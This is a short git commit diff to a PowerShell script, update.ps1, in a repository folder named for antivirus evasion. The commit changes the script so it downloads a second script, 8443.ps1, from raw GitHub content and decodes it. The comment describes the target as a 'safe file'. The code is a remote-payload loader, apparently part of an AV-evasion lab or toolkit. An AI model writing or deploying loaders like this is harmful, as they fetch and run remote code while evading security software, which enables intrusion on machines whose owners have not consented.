136933021a49185cb14e95381b45112f9f86ccb6
salahgeek <salahgeek07@gmail.com>
2024-05-09 21:05:48 +0100

    Update update.ps1

--- LAS/Av-evasion/update.ps1
+++ LAS/Av-evasion/update.ps1
@@ -1,5 +1,5 @@
 ﻿# URL to download safe file
-$scriptUrl = "https://github.com/salahgeek/LAB/blob/main/LAS/Av-evasion/8443.ps1"
+$scriptUrl = "https://raw.githubusercontent.com/salahgeek/LAB/main/LAS/Av-evasion/8443.ps1"
 # Download script
 $scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
 $scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
